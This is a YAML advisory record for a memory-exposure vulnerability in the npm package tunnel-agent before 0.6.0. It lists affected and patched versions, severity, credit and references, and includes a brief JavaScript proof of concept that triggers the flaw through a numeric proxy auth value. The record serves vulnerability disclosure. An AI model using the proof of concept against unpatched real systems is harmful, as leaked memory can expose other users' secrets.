---
- id: nodesecurity:npm:tunnel-agent:2018-04-25
  title: Memory Exposure
  description: |-
    Versions of `tunnel-agent` before 0.6.0 are vulnerable to memory exposure.

    This is exploitable if user supplied input is provided to the auth value and is a number.

    Proof-of-concept:
    ```js
    require('request')({
      method: 'GET',
      uri: 'http://www.example.com',
      tunnel: true,
      proxy:{
        protocol: 'http:',
        host:'127.0.0.1',
        port:8080,
        auth:USERSUPPLIEDINPUT // number
      }
    });
    ```
  affected_package: tunnel-agent
  vulnerable_versions:
  - "<0.6.0"
  patched_versions:
  - ">=0.6.0"
  severity: medium
  package_manager: npm
  credit:
  - Сковорода Никита Андреевич
  references:
  - |-
    https://github.com/request/tunnel-agent/commit/9ca95ec7219daface8a6fc2674000653de0922c0)
    https://gist.github.com/ChALkeR/fd6b2c445834244e7d440a043f9d2ff4)
  source_url: https://nodesecurity.io/advisories/598
